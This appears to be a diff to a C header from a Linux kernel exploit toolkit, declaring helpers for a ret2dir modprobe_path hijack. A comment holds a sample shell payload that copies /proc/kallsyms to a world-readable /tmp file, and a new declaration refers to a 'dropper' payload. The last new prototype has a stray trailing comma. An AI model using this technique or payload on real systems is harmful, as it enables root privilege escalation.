@@ -16,21 +16,29 @@
  *  const char *dummy   = "/tmp/d";
  *  const char *res     = "/tmp/syms";
  *
- *  const char *script = 
+ *  const char *payload = 
  *      "#!/bin/sh\n"
  *      "cat /proc/kallsyms > /tmp/syms\n"
  *      "chmod 777 /tmp/syms\n";
  *
  *  A return point after privesc in user space
  */
-void ret2dir_modprobe(
+
+/* Test by writing a shell script for faked modprobe_path */
+void ret2dir_modprobe_path_test(
     const char *modprobe_path_addr,   
     const char *fake_modprobe_path,   // e.g. "/tmp/w" "/tmp/f"
     const char *dummy_trigger_path,   // e.g. "/tmp/d"
     const char *result_file_path,     // e.g. "/tmp/syms"
-    const char *evil_script       
+    const char *payload       
 );
 
+/* Use a dropper from payloads/dropper.h > faked modprobe_path */
+void ret2dir_modprobe_path_(
+    const char *modprobe_path_addr,   
+    const char *fake_modprobe_path,   // e.g. "/tmp/w" "/tmp/f"
+    const char *dummy_trigger_path,   // e.g. "/tmp/d"
+);
 
 
 
